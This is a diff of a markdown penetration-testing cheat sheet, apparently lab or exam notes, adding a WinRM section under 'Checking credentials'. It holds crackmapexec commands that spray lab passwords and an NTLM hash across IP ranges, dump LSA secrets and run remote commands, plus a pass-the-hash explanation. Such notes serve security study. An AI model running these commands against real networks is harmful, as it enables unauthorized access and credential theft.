@@ -2072,10 +2072,15 @@ xor-app23.xor.com #found this from either the tgt, mimikatz, etc. Shows you wher
 Address: 10.11.1.121
 ````
 ##### Checking credentials
+###### SMB
 ````
 crackmapexec smb 10.11.1.120-124 -u Daisy -p XorPasswordIsDead17 -d xor.com -x whoami #change smb to other services
 crackmapexec smb 10.11.1.120-124 -u administrator -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
 crackmapexec smb 10.11.1.20-24 -u pete -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
+````
+###### winrm
+````
+proxychains crackmapexec winrm 172.16.138.10-83 -u users.txt -p Mushroom! -d MEDTECH.COM -x whoami
 ````
 #### Pass the Hash <img src="https://cdn-icons-png.flaticon.com/128/6107/6107027.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/6050/6050858.png" width="40" height="40" />
 The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.
